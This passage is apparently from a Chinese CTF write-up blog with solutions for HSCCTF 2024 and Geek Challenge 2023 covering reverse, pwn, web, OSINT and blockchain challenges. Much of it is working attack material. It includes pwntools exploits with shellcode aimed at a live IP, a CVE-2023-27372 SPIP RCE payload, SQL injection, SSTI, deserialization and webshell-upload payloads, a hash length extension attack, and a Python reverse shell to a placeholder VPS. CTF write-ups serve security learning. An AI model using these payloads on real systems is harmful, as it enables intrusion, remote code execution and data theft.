函数不完整，根据提示是一种填充图片的算法，必定遍历0~65535共65536个下标值。 结合 m = 1 &lt;&lt; (n - 1) 和传入的 $n=128=\\frac{256}{2}$，猜测为使用Hilbert曲线遍历 $256 \\times 256$ 个值。 找到Hilbert曲线递归遍历的代码，补充 f() 函数，还原flag.jpg： 123456789101112131415161718192021222324252627282930313233343536373839404142def f(n, x, y): if n == 0: return 1 m = 1 &lt;&lt; (n - 1) if x &lt;= m: if y &lt;= m: return f(n - 1, y, x) else: return m * m + f(n - 1, x, y - m) else: if y &gt; m: return 2 * m * m + f(n - 1, x - m, y - m) else: return 3 * m * m + f(n - 1, m + 1 - y, m + 1 - (x - m)) j = 128mm = []for i in range(1, 257): for s in range(1, 257): mm.append(f(j, i, s) - 1)print(mm)from PIL import Imageimg = Image.open(&#x27;enc.jpg&#x27;)pixels = list(img.getdata())c = [pixel for pixel in pixels]img = Image.open(&#x27;key.png&#x27;)pixels = list(img.getdata())png_key = [pixel for pixel in pixels]for s in range(65536): c[s] = c[s] ^ png_key[s]flag = [0] * 65536for i in range(65536): flag[mm[i]] = c[i]image = Image.new(&#x27;L&#x27;, (256, 256))image.putdata(flag)image.save(&#x27;flag.jpg&#x27;) 得到原始图片： flag：HSCCTF&#123;oh!_you_c_yhhhh&#125;。 ​ REVERSETEA 将得到的flag改为HSCCTF。 简答TEA加密。 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vcheck_index = [3,1,0,2]check_enc = [0x05,0xd7,0xb8,0x67]c = [check_enc[check_index[i]] for i in range(4)]c0 = bytes_to_long(bytes(c)[::-1])c1 = int(&#x27;3c471c36&#x27;[::-1],16)key = [2, 2, 3, 4]d = decrypt([c0,c1], key)print(hex(d[0])[2:]+&#x27;-&#x27;+hex(d[1])[2:])#688ed036-a86a60ce flag：flag&#123;688ed036-a86a60ce&#125; ​ ROULETTE 听说麻将连胜8局达到8本场就可以直接役满？！！那么…这个游戏连胜8局难道会直接得到flag？！！！（宫永照脸flag形式同其他题目。 patch main_0() 中的 call sub_43E165 为 call sub_445990， 再运行patch后的程序，直接输出结果 HSCCTF&#123;H31L0_My_FR13ND!&#125;。 ​ THE_WOLF_SONG flag形式为:HSCCTF{this_is_an_example}听电子音乐，享赛博人生。 patch main函数的输出。进入 sub_1400440F0()，识别为RC4算法。 照代码逻辑动调逆一下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445c = [0xCE, 0x26, 0x9C, 0x07, 0x48, 0xD9, 0xFD, 0x23, 0xBA, 0x9A, 0x40, 0xA8, 0x2E, 0xBD, 0xFC, 0x77, 0xB7, 0x5D, 0x7E, 0x67, 0x99, 0xFD, 0xCD, 0x63, 0x13, 0x0A, 0x94, 0x5B, 0x95, 0x2C, 0x26, 0x60, 0x1E, 0x1E, 0xB4, 0x30, 0x89, 0xCF, 0xEF, 0x68]b890 = [1,2,3,4,5,6,7,8,9,0,0,0,0,0,0,0]b8a0 = [5,2,3,1,4,7,8,6,0,5,0xa,0xf,0x14,0x19,0x1e,0]k = b&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;c = [c[i]^i for i in range(len(c))]c = [c[i]^(k[i+1] if i&lt;len(k)-1 else 0) for i in range(len(c))]c = [c[i]^(k[i] if i&lt;len(k) else 0) for i in range(len(c))]c = [c[i]^i for i in range(len(c))]# RC4N = 256S = [0] * Nkey = &#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;Key = [0] * Nt = c[:]for i in range(N): S[i] = i Key[i] = ord(key[i % len(key)])j = 0for i in range(N): j = (j + S[i] + Key[i]) % N S[i], S[j] = S[j], S[i]i = 0j = 0for k in range(len(t)): i = (i + 1) % N j = (j + S[i]) % N S[i], S[j] = S[j], S[i] t[k] ^= S[(S[i] + S[j]) % N]print(t)t = [k^b890[b8a0[1]] for k in t]t = [k^b890[b8a0[0]] for k in t]print(bytes(t))b&#x27;HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;&#x27; ​ NO_PY flag形式为:HSCCTF{this_is_an_example} 将得到的flag改为HSCCTF。 参考 BeginCTF 2024 - ezpython。 pyinstxtractor解包程序，pycdc反编译pyc , 发现是个SM4加密，缺少 key 和 enc。 继续反编译 PYZ-00.pyz_extracted/secret.pyc ： 12key = &#x27;Please_Do_not_py&#x27;enc = b&#x27;YJ+70VWYioYm3EhF6qdScVXBpCdPm+hCS/HP+Gj421RyxkZbwzni7o2zGG/Mis4Wr6sbXYr4ufnKwQk7vrG8yA==&#x27; 直接用SM4解不出，再反编译看 PYZ-00.pyz_extracted/gmssl/sm4.pyc 对比，发现魔改点，对key做了异或操作：key = (lambda .0: [ i ^ 102 for i in .0 ])(key) 将key异或102，再SM4解密得flag：flag&#123;Pay_M0re_@ttention_to_th3_key!!&#125;。 ​ PWNSTACK栈溢出，gift() 函数只给了 jmp rsp，控制rsp即可。 12345------------------------------------------------------------------------------------| buf | rbp | ret | ... ... |------------------------------------------------------------------------------------| shellcode + padding | gadget(jmp rsp) | asm(sub rsp, 0x90;jmp rsp) |------------------------------------------------------------------------------------ 当ret的时候，rip被赋值，指向了当前的rsp所指向的值，即jmp rsp的gadget，同时rsp自减一个字； 当程序继续执行，jmp rsp时，执行流被劫持到栈上，具体地址为ret的后一个字； 继续执行我们布置好的指令：rsp自减，指向buf开头，即shellcode开头。rip自动后移，指向jmp rsp； 继续执行，控制流jmp到rsp所指，buf的开头区域，顺利执行shellcode。 1234567891011121314from pwn import *r=remote(&#x27;111.180.204.186&#x27;,14028)context(arch=&#x27;amd64&#x27;)gift=0x40063Bret=0x40050er.recvline()sc=b&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;pl=sc.ljust(0x20+8,b&#x27;\\x00&#x27;)+p64(gift)+asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)r.sendline(pl)r.interactive() ​ PWN01参考 NJCTF 2017 - messager， 在函数 sub_400BE9() 存在一个明显的栈溢出漏洞，由于程序fork出了子进程，子进程的崩溃不影响主进程，故可通过爆破方式突破canary保护，覆盖函数返回地址改为 sub_400B8E() 得到flag。 123456789101112131415161718192021222324252627282930from pwn import *def get_canary(): canary = b&#x27;\\x00&#x27; while len(canary) &lt; 8: for x in range(256): r = remote(&#x27;111.180.204.186&#x27;, 14831) r.recv() r.send(b&#x27;a&#x27; * 104 + canary + bytes([x])) try: r.recv() canary += bytes([x]) break except: pass finally: r.close() print(x,canary) return canarycanary = get_canary()print(canary)r = remote(&#x27;111.180.204.186&#x27;, 14831)target = 0x400b8epayload = b&#x27;a&#x27; * 104 + canary + b&#x27;a&#x27; * 8 + p64(target)r.send(payload)r.interactive() ​ PWN02参考 BUUCTF - inndy_echo2，PIE+64为fmt，利用fmt泄露canary和程序基址，再改printf的got地址为system_plt即可。 123456789101112131415161718192021from pwn import *r=remote(&#x27;111.180.204.186&#x27;,13978)elf=ELF(&#x27;./pwn&#x27;)context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;)r.sendline(b&#x27;%39$p&#x27;)canary=eval(r.recvline())print(hex(canary))r.sendline(b&#x27;%41$p&#x27;)pie=eval(r.recvline())-74-0x9b9print(hex(pie))system_plt=pie+0x790 printf_got=pie+elf.got.printfpl=fmtstr_payload(6, &#123;printf_got:system_plt&#125;)r.sendline(pl)r.interactive() ​ GHOST参考 RoarCTF 2019 - Ez-op，题目是一个功能简单的vm，共有push/pop/add/sub/mul/div/load/save 8种指令。 漏洞在于load和save没有对offset进行检查，导致vm stack越界访问和写入，而题目是静态编译，free_hook和system等地址都已知。 由于stack-&gt;data指向堆，所以需要先利用load将堆地址读入vm stack中，然后和bss上的free_hook进行sub操作，再进行div 4就可以获得堆地址和free_hook之间的偏移，将system地址写入之后，后面触发free(input)的地方就可以getshell。 12345678910111213141516171819202122232425from pwn import *r = remote(&#x27;111.180.204.186&#x27;,11764)push = 0xAAAApop = 0xBBBBadd = 0xCCCCsub = 0xDDDDmul = 0xEEEEdiv = 0xFFFFload = 0x1145save = 0x1919system_addr = 0x8050940free_hook = 0x80dc9F0def create(d): return &quot; &quot;.join([str(x) for x in d])heap_offset = (0x110-8) // 4code = create([push,push,push,push,load,push,sub,div,save])data = create([&quot;/bin/sh&quot;,system_addr,4,heap_offset,free_hook])r.sendline(code)r.sendline(data)r.interactive() ​ WEBCHECKIN 12345678910&lt;?phphighlight_file(__FILE__);error_reporting(0);$a=$_POST[1];$b=&quot;php://filter/$a/resource=/dev/null&quot;;if(file_get_contents($b)===&quot;2024&quot;)&#123; echo file_get_contents(&#x27;/flag&#x27;);&#125;else&#123; echo $b;&#125; 参考 ImaginaryCTF Round 28 - Filter Master，预期是构造filter链生成所需字符串。 非预期： 传入 resource=data:,2024&lt;|string.strip_tags|，利用PHP通过简单识别 | 作为filter分割字符来选择filter的特性。 payload： POST 1=resource=data:,2024&lt;|string.strip_tags| ​ PWD 123456789101112131415161718192021&lt;?phperror_reporting(0);highlight_file(__FILE__);$con = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ccut&quot;);function waffff($sql) &#123; if (preg_match(&quot;/infor|sys|sql|thread|case|when|if|like|left|right|mid|cmp|sub|locate|position|match|find|field|sleep|repeat|lock|bench|process|&lt;|&gt;|=|xor|and|&amp;&amp;|\\\\\\\\/i&quot;, $sql)) &#123; die(&quot;hacker&quot;); &#125;&#125;if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; waffff($password); $sql = &quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;&quot;; $user_result = mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if ($row[&#x27;password&#x27;] === $password) &#123; include &quot;/flag&quot;; &#125; else &#123; echo &quot;error&quot;; &#125;&#125; 要求输入的password参数值等于系统的password值，利用union select实现输入和输出内容一致，Quine注入。 POST: password=1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))# ​ TMPLSSTI漏洞，限制了部分字符，用fenjing解决。 payload： &#123;&#123;g|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*3)%(112,111,112))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,108,111,98,97,108,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*12)%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*10)%(95,95,105,109,112,111,114,116,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*2)%(111,115))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*5)%(112,111,112,101,110))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*9)%(99,97,116,32,47,102,108,97,103))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*4)%(114,101,97,100))()&#125;&#125; ​ SHIROSHORTMENSHELL使用shiro攻击工具shiro_attack-4.5.2-SNAPSHOT-all.jar，找到key：kPH+bIxk5D2deZiIxcaaaA==，再用cb1链打通getshell即可。 ​ DESERIALIZATIONSPIP CMS &lt;v4.2.1 反序列化RCE漏洞（CVE-2023-27372） 参考：【漏洞复现】CVE-2023-27372 RCE漏洞 列目录： 123POST /spip.php?page=spip_passpage=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:21:&quot;&lt;?=system(&#x27;ls /&#x27;); ?&gt;&quot;;&amp;nobot= 读文件： 123POST /spip.php?page=spip_pass HTTP/1.1page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:25:&quot;&lt;?=system(&#x27;uniq /f*&#x27;); ?&gt;&quot;;&amp;nobot= ​ LOG Hint: 同学发给我一个网址https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c0760496&amp;applicant=admin&amp;filename=web.log，说让我帮忙看看网站运行日志，同学说这是他写的一个非常安全方便的文件查看器。 真的安全吗？ 1234567891011121314&lt;?phperror_reporting(0);$secret=getenv(&quot;SECRETKEY&quot;); # For security reasons, the key length is greater than 8.if(isset($_GET[&quot;md5&quot;]) &amp;&amp; isset($_GET[&quot;applicant&quot;]) &amp;&amp; isset($_GET[&quot;filename&quot;]))&#123; if($_GET[&quot;md5&quot;] === md5($secret.$_GET[&quot;applicant&quot;].$_GET[&quot;filename&quot;]))&#123; $file_contents = file_get_contents($_GET[&quot;filename&quot;]); echo $file_contents; &#125;else&#123; die(&quot;My tool is safe.&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 哈希长度扩展攻击。 已知secret位数大于8，已知明文 adminweb.log，已知md5 hash=9c80d2bb0bccfefeb3750744c0760496，扩展字符 /flag。 利用脚本爆破secret位数，尝试到15的时候成功获取flag： 1234567891011python3 hash_ext_attack.py 2024-03-10 08:17:33.714 | DEBUG | common.md5_manual:__init__:17 - init......请输入已知明文：adminweb.log请输入已知hash： 9c80d2bb0bccfefeb3750744c0760496请输入扩展字符: /flag请输入密钥长度：152024-03-10 08:27:02.695 | INFO | __main__:run:69 - 已知明文：b&#x27;adminweb.log&#x27;2024-03-10 08:27:02.695 | INFO | __main__:run:70 - 已知hash：b&#x27;9c80d2bb0bccfefeb3750744c0760496&#x27;2024-03-10 08:27:02.695 | INFO | __main__:run:72 - 新明文：b&#x27;adminweb.log\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd8\\x00\\x00\\x00\\x00\\x00\\x00\\x00/flag&#x27;2024-03-10 08:27:02.695 | INFO | __main__:run:73 - 新明文(url编码)：adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00%2Fflag2024-03-10 08:27:02.695 | INFO | __main__:run:75 - 新hash:46879013726bfb7dff6921fd2e9ab2f8 payload： GET /?md5=46879013726bfb7dff6921fd2e9ab2f8&amp;applicant=adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00&amp;filename=/flag ​ OSINTNICE_RIVER百度识图，识别大桥为琶洲大桥，根据方位定位到保利天幕广场员工停车场：HSCCTF&#123;23.10393,113.38363&#125;。 ​ городgoogle识图，找到https://wikimapia.org/4495454/Olonkho-shopping-centre 定位为Olonkho shopping centre，定位点：HSCCTF&#123;62.03716,129.73620&#125; ​ CAR截取楼的部分百度识图，识别出为渝州宾馆。 小红书里搜索渝州宾馆，看到一张清晰的图片，正对的是渝州宾馆黄山厅，左边是大堂。 结合百度和google卫星视图看，得到定位点：HSCCTF&#123;29.53201,106.50045&#125;。 ​ FLAG搜索关键词：圣彼得堡+广场+船锚，找到相关图片：https://www.huitu.com/photo/show/20190424/162434930070.html。 定位为圣彼得堡瓦西里岛古港口，定位点：HSCCTF&#123;59.94387,30.30595&#125;。 ​ CITY百度识图，找到米漾米居酒店，地址：HSCCTF&#123;山东省菏泽市牡丹区黄巢路7号&#125;。 ​ BLOCKCHAINBONUS 年终奖 坏消息：公司只给你发了一张超市的会员卡作为年终奖好消息：余额有114514元坏消息：只能用来购买一块钱的糖，一次只能买一个好消息：余额只剩1元时可以获得名为flag的神秘大奖兑奖地址：nc xx.xx.xx.xx xxxx 智能合约部署网络为Polygon Mumbai地址为：0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a 1234567891011121314151617181920//contract.sol// SPDX-License-Identifier: MITpragma solidity ^0.7.0;contract VipCard &#123; mapping(address =&gt; uint) public balances; function applyCard() public &#123; balances[msg.sender] = 114514; &#125; function topUp(uint _amount) public &#123; balances[msg.sender] += _amount; &#125; function buyCandy() public &#123; require(balances[msg.sender] &gt; 0, &quot;not sufficient funds&quot;); balances[msg.sender] -= 1; &#125;&#125; 非预期，进入区块链浏览器PolygonScan查看地址0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a的交易记录，输入输入已完成题目要求的选手的地址即可。 预期解应该是uint上溢出漏洞。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2024赛","slug":"2024赛","permalink":"https://lazzzaro.github.io/tags/2024%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"Geek Challenge 2023","slug":"match-Geek-Challenge-2023","date":"2023-11-27T10:28:02.000Z","updated":"2024-03-31T10:02:56.254Z","comments":true,"path":"2023/11/27/match-Geek-Challenge-2023/","permalink":"https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/","excerpt":"","text":"​ 第十四届极客大挑战 GEEK CHALLENGE 2023‼️开放注册：10月25日晚10点比赛时间：10月26日晚8点-11月26日晚8点平台链接：https://game.sycsec.com/赛题范围包括re，web，pwn，crypto，misc等等，本届赛题还加入全新yak语言元素，方向多样，趣味性高。本届更增添校外排行榜，校外的同学们组队参与也能获得名次奖励，欢迎大家前来挑战 💪。 Rank: 3 WEBEzHttp http签到，点击就送flag http://1.117.175.65:23333/ robots.txt 获取账号密码，再按步骤用几个请求头字段绕过： 1234567891011POST / HTTP/1.1Host: 1.117.175.65:23333User-Agent: SycloverReferer: sycsec.comX-Forwarded-For: 127.0.0.1via: Syc.vipO2TAKUXX: GiveMeFlagContent-Type: application/x-www-form-urlencodedContent-Length: 40username=admin&amp;password=@dm1N123456r00t# ​ unsign 来签个到吧先 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phphighlight_file(__FILE__);class syc&#123; public $cuit; public function __destruct() &#123; echo(&quot;action!&lt;br&gt;&quot;); $function=$this-&gt;cuit; return $function(); &#125;&#125;class lover&#123; public $yxx; public $QW; public function __invoke() &#123; echo(&quot;invoke!&lt;br&gt;&quot;); return $this-&gt;yxx-&gt;QW; &#125;&#125;class web&#123; public $eva1; public $interesting; public function __get($var) &#123; echo(&quot;get!&lt;br&gt;&quot;); $eva1=$this-&gt;eva1; $eva1($this-&gt;interesting); &#125;&#125;if (isset($_POST[&#x27;url&#x27;])) &#123; unserialize($_POST[&#x27;url&#x27;]);&#125;?&gt; 反序列化： 12345678910111213141516from phpserialize import serializeclass web: public_eva1=&#x27;system&#x27; public_interesting=&#x27;cat /f*&#x27; class lover: public_yxx=web() public_QW=&#x27;x&#x27; class syc: public_cuit=lover() print(serialize(syc()))# O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125; POST： url=O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125; ​ n00b_Upload文件上传绕过：MIME、图片头、绕关键字 构造请求头： 123Content-Type: image/pngGIF89a&lt;?=system($_GET[x]); 上传成功后，访问 uploadtest/378845_653a63ea1370a.php?x=cat /flag 拿flag。 ​ easy_php 学了php了，那就来看看这些绕过吧 123456789101112131415161718192021222324252627282930&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;syc&#x27;])&amp;&amp;preg_match(&#x27;/^Welcome to GEEK 2023!$/i&#x27;, $_GET[&#x27;syc&#x27;]) &amp;&amp; $_GET[&#x27;syc&#x27;] !== &#x27;Welcome to GEEK 2023!&#x27;) &#123; if (intval($_GET[&#x27;lover&#x27;]) &lt; 2023 &amp;&amp; intval($_GET[&#x27;lover&#x27;] + 1) &gt; 2024) &#123; if (isset($_POST[&#x27;qw&#x27;]) &amp;&amp; $_POST[&#x27;yxx&#x27;]) &#123; $array1 = (string)$_POST[&#x27;qw&#x27;]; $array2 = (string)$_POST[&#x27;yxx&#x27;]; if (sha1($array1) === sha1($array2)) &#123; if (isset($_POST[&#x27;SYC_GEEK.2023&#x27;])&amp;&amp;($_POST[&#x27;SYC_GEEK.2023&#x27;]=&quot;Happy to see you!&quot;)) &#123; echo $flag; &#125; else &#123; echo &quot;再绕最后一步吧&quot;; &#125; &#125; else &#123; echo &quot;好哩，快拿到flag啦&quot;; &#125; &#125; else &#123; echo &quot;这里绕不过去，QW可不答应了哈&quot;; &#125; &#125; else &#123; echo &quot;嘿嘿嘿，你别急啊&quot;; &#125;&#125;else &#123; echo &quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;;&#125;?&gt; 第1层：换行符绕过； 第2层：科学计数法绕 intval()； 第3层：sha1碰撞； 第4层：PHP解析特性。 123456POST /?syc=Welcome%20to%20GEEK%202023!%0a&amp;lover=2e5 HTTP/1.1Host: h2y55ia9rcbaswjlhegv0qonf.node.game.sycsec.comContent-Length: 1320Content-Type: application/x-www-form-urlencodedqw=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;yxx=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;SYC[GEEK.2023=Happy to see you! ​ ctf_curl 命令执行？真的吗？ 1234567891011121314&lt;?phphighlight_file(&#x27;index.php&#x27;);// curl your domain// flag is in /tmp/Sycloverif (isset($_GET[&#x27;addr&#x27;])) &#123; $address = $_GET[&#x27;addr&#x27;]; if(!preg_match(&quot;/;|f|:|\\||\\&amp;|!|&gt;|&lt;|`|\\(|&#123;|\\?|\\n|\\r/i&quot;, $address))&#123; $result = system(&quot;curl &quot;.$address.&quot;&gt; /dev/null&quot;); &#125; else &#123; echo &quot;Hacker!!!&quot;; &#125;&#125;?&gt; 利用VPS和curl写文件的参数： ?addr=-O%201.php%20x.x.x.x/1.txt 其中 1.txt 内容为：&lt;?php system(&quot;cat /tmp/Syclover&quot;);?&gt; 访问 1.php 得flag。 ​ klf_ssti De1ty的广东朋友跟女神表白被骂klf，现在气急败坏，你知道klf是什么意思嘛？他现在依旧觉得他不是klf你们才是，你能拿到flag证明他是klf嘛… 路由：/hack?klf=xxx 无过滤，但也无输出的SSTI盲打，利用python反弹shell到VPS： /hack?klf=&#123;%print(config.__class__.__init__.__globals__['os'].popen('python3 -c \\'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"x.x.x.x\",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")\\' ').read())%&#125; 在根目录拿到flag。 ​ ez_remove 我想要回炉重造一波，怎么说，难道你不想吗 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);class syc&#123; public $lover; public function __destruct() &#123; eval($this-&gt;lover); &#125;&#125;if(isset($_GET[&#x27;web&#x27;]))&#123; if(!preg_match(&#x27;/lover/i&#x27;,$_GET[&#x27;web&#x27;]))&#123; $a=unserialize($_GET[&#x27;web&#x27;]); throw new Error(&quot;快来玩快来玩~&quot;); &#125; else&#123; echo(&quot;nonono&quot;); &#125;&#125;?&gt; 反序列化，用 S 绕关键字过滤，去最后大括号绕 Exception。 发现读不出根目录flag值，存在open_basedir，利用绕过命令读： /?web=O:3:&quot;syc&quot;:1:&#123;S:5:&quot;\\6cover&quot;;s:142:&quot;mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);readgzfile(&#39;/f1ger&#39;);&quot;; ​ ez_path 快来join我的博客吧！ 源码注释：&lt;!--secret在根目录f14444文件里面，别忘记了--&gt;。 首页得到泄露的文件 app.cpython-39.pyc，反编译得python源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import os, uuidfrom flask import Flask, render_template, request, redirectapp = Flask(__name__)ARTICLES_FOLDER = &#x27;articles/&#x27;articles = []class Article: def __init__(self, article_id, title, content): self.article_id = article_id self.title = title self.content = contentdef generate_article_id(): return str(uuid.uuid4())@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;index.html&#x27;, articles=articles)@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload(): if request.method == &#x27;POST&#x27;: title = request.form[&#x27;title&#x27;] content = request.form[&#x27;content&#x27;] article_id = generate_article_id() article = Article(article_id, title, content) articles.append(article) save_article(article_id, title, content) return redirect(&#x27;/&#x27;) else: return render_template(&#x27;upload.html&#x27;)@app.route(&#x27;/article/&lt;article_id&gt;&#x27;)def article(article_id): for article in articles: if article.article_id == article_id: title = article.title sanitized_title = sanitize_filename(title) article_path = os.path.join(ARTICLES_FOLDER, sanitized_title) with open(article_path, &#x27;r&#x27;) as (file): content = file.read() return render_template(&#x27;articles.html&#x27;, title=sanitized_title, content=content, article_path=article_path) return render_template(&#x27;error.html&#x27;)def save_article(article_id, title, content): sanitized_title = sanitize_filename(title) article_path = ARTICLES_FOLDER + &#x27;/&#x27; + sanitized_title with open(article_path, &#x27;w&#x27;) as (file): file.write(content)def sanitize_filename(filename): sensitive_chars = [&#x27;:&#x27;, &#x27;*&#x27;, &#x27;?&#x27;, &#x27;&quot;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;|&#x27;, &#x27;.&#x27;] for char in sensitive_chars: filename = filename.replace(char, &#x27;_&#x27;) return filenameif __name__ == &#x27;__main__&#x27;: app.run(debug=True) 利用绝对路径拼接漏洞： 